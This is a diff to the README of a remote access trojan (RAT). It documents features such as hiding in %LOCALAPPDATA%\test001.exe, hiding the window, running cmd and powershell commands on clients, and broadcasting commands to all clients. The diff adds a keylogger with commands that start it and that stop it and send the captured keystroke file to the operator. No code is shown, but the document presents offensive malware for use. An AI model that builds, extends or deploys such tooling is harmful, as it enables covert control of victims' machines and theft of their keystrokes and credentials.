@@ -27,6 +27,7 @@ Features
 * Hiding himself in %LOCALAPPDATA%\test001.exe
 * Hiding the application window
 * Working on WAN
+* Keylogger option
 * Broadcast Clients
 * Getting all the files in a directory
 * If the Python server or The client (RAT) or The Node.js Server are crashed the other programs won't crash
@@ -50,8 +51,9 @@ Commands
 |cmd| `(The command that you want to execute)`|Running the command in cmd and returning the output|
 |powershell| `(The command that you want to execute)`|Running the command in powershell and returning the output|'
 |broadcast| `(The command that you want to execute)`|Running the command in every single client|
-|quit| |Quits the Client|
-
+|start keylogger| |Starting the keylogger|
+|stop keylogger| |Stopping the keylogger and sending the keylogger file to you|
+|quit| |Closing the client|
 
 Requirements
 ---
